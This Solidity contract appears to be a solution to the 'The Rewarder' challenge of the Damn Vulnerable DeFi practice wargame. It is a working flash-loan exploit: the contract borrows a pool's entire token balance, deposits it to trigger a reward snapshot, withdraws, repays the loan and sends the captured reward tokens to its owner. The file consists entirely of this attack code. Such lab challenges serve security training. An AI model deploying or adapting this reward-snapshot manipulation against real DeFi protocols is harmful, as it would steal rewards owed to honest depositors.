// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "./RewardToken.sol";

contract Loaner {
    constructor(
        FlashLoanerPool _flashLoaner,
        TheRewarderPool _rewarder,
        DamnValuableToken _dvt,
        address _rewardTokenAddr
    ) {
        loanPool = _flashLoaner;
        rewardPool = _rewarder;
        liquidityToken = _dvt;
        rewardToken = RewardToken(_rewardTokenAddr);
        owner = msg.sender;
    }

    address public immutable owner;
    TheRewarderPool public immutable rewardPool;
    FlashLoanerPool public immutable loanPool;
    DamnValuableToken public immutable liquidityToken;
    RewardToken public immutable rewardToken;

    function receiveFlashLoan(uint256 amount) external {
        // approve rewarder to spend
        liquidityToken.approve(address(rewardPool), type(uint256).max);
        //call rewarder to make deposit
        rewardPool.deposit(amount);
        // we can withdraw now that we have trigggered the snapshot
        rewardPool.withdraw(rewardPool.accToken().balanceOf(address(this)));
        //send funds back to loanPool
        liquidityToken.transfer(
            address(loanPool),
            liquidityToken.balanceOf(address(this))
        );
    }

    function startLoan() external {
        loanPool.flashLoan(liquidityToken.balanceOf(address(loanPool))); // take out loan.
        //collect rewards
        rewardPool.distributeRewards();
        // send to owner
        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
    }
}
